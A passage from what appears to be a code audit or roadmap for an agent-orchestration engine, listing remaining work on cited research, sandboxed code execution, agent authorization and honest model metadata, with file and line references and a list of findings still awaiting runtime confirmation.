- Replace/annotate deterministic `marketFor` rows (`engine.ts:31-58`) with a research pipeline
  that can emit `source:"cited"` competitors (`types.ts:63-64` reserves the value); keep the
  illustrative fallback labeled.
- P0/P7 synthesis (`engine.ts:239-306,517-542`) should accept model-produced scorecard/ADR input
  or stay deterministic *and say so* (already labeled in packet `packet.ts:208`).
- P11's "Brave Search MCP binding" is a static JSON artifact (`engine.ts:631-664`) — real live
  search needs an MCP/HTTP client, result allow-listing (prompt-injection risk is already called
  out at `algorithms.ts:607`), caching, and per-domain rate caps per `schedule.apiDelta`
  (`algorithms.ts:267-272`).
- All research results flowing into memory must keep the "no fabricated citations" rule; write
  back through `MemoryEntry` with phase + provenance.

**G4. Real code execution**
- Dispatch engine P6 on `project.sandbox.runtime` (CORE-08): engine-authored modules → current
  sync path; LLM/user-authored source → `runSandboxed` (`sandbox.ts:242`) with `workerFactory`
  injection and the CORE-18/CORE-19 fixes first.
- Make the P6 flow async end-to-end (`store.ts:147-184` `runReady` is synchronous today) and carry
  `SandboxResult.detail`/logs into `lastTest` + gate evidence (`store.ts:63-104`).
- Enforce attempt caps (the "stop when oracle tests fail twice" rule lives only in crew text,
  `algorithms.ts:509`) and keep `healSource` single-shot semantics
  (`sandbox.ts:99-104`, `engine.ts:464-471`).
- Reconcile CORE-21's dormant P9-deploy-block with real deployment gating.

**G5. AuthN/Z for agent callers** — every engine mutation invoked by an agent must carry the
invoking user's identity and OAuth scope check (declared at `engine.ts:406-408`, enforced
nowhere) before touching `decisions`/`memory`.

**G6. Honest model metadata** — see R-1/CORE-17; modelRoute must be set by real routing or the
packet must say "no model executed (simulation)".

---

## 9. Unverified / needs-runtime-confirmation

- CORE-11 reachability (analytic only; would need a crafted lattice through `runUntilHitl` with
  autopilot on).
- CORE-14's mid-JSON truncation needs a ≥ ~60-row ledger to reproduce (verified construction
  math only).
- Whether `console.tsx` calls `refreshPacket` anywhere besides `copyPacket` (line 369): grepped
  only that one call site — the packet *tab* (`console.tsx:833`) renders `project.packet` without
  a refresh, so CORE-04's staleness is user-visible; confirmed by inspection, not by interaction.
- `maskLiteralsAndComments` (`sandbox.ts:24-67`) edge cases for unterminated strings/escaped
  quotes over-mask to EOF (safe direction for false-passes, but untested for template-literal
  `${}` boundaries; covered by sandbox.test.ts only partially).
